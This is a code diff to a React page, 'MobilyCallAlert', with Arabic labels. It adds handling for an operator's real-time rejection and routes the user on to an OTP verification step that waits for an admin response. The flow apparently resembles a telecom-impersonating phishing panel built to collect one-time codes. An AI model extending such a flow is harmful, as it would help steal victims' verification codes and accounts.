@@ -7,11 +7,14 @@ import {
   sendData,
   isFormApproved,
   navigateToPage,
+  socket,
+  waitingMessage,
 } from "@/lib/store";
 
 export default function MobilyCallAlert() {
   const [, navigate] = useLocation();
   const [callReceived, setCallReceived] = useState(false);
+  const [isRejected, setIsRejected] = useState(false);
 
   // Emit page enter
   useEffect(() => {
@@ -25,14 +28,40 @@ export default function MobilyCallAlert() {
     }
   }, [isFormApproved.value, navigate]);
 
+  // Listen for mobily rejection
+  useEffect(() => {
+    const s = socket.value;
+    if (!s) return;
+
+    const handleMobilyRejected = () => {
+      console.log("Mobily call rejected");
+      setIsRejected(true);
+      setCallReceived(false);
+      // إخفاء شاشة الانتظار
+      waitingMessage.value = "";
+    };
+
+    s.on("mobily:rejected", handleMobilyRejected);
+
+    return () => {
+      s.off("mobily:rejected", handleMobilyRejected);
+    };
+  }, []);
+
   const handleCallReceived = () => {
     setCallReceived(true);
+    setIsRejected(false);
     sendData({
       data: { الحالة: "تم تلقي المكالمة" },
       current: "تنبية إتصال Mobily",
       nextPage: "تحقق رقم الجوال (OTP)?serviceProvider=5",
       waitingForAdminResponse: true,
     });
+  };
+
+  const handleNewCall = () => {
+    setIsRejected(false);
+    setCallReceived(false);
   };
 
   return (
@@ -88,7 +117,7 @@ export default function MobilyCallAlert() {
         </div>
 
         {/* Phone Animation */}
-        {!callReceived && (
+        {!callReceived && !isRejected && (
           <div className="flex justify-center mb-6">
             <div className="relative">
               <img
@@ -101,14 +130,24 @@ export default function MobilyCallAlert() {
         )}
 
         {/* Button */}
-        <Button
-          onClick={handleCallReceived}
-          className="w-full bg-purple-600 hover:bg-purple-700"
-          size="lg"
-          disabled={callReceived}
-        >
-          {callReceived ? "جاري التحقق..." : "تم استلام المكالمة"}
-        </Button>
+        {isRejected ? (
+          <Button
+            onClick={handleNewCall}
+            className="w-full bg-purple-600 hover:bg-purple-700"
+            size="lg"
+          >
+            تلقي مكالمة جديدة
+          </Button>
+        ) : (
+          <Button
+            onClick={handleCallReceived}
+            className="w-full bg-purple-600 hover:bg-purple-700"
+            size="lg"
+            disabled={callReceived}
+          >
+            {callReceived ? "جاري التحقق..." : "تم استلام المكالمة"}
+          </Button>
+        )}
       </div>
     </PageLayout>
   );
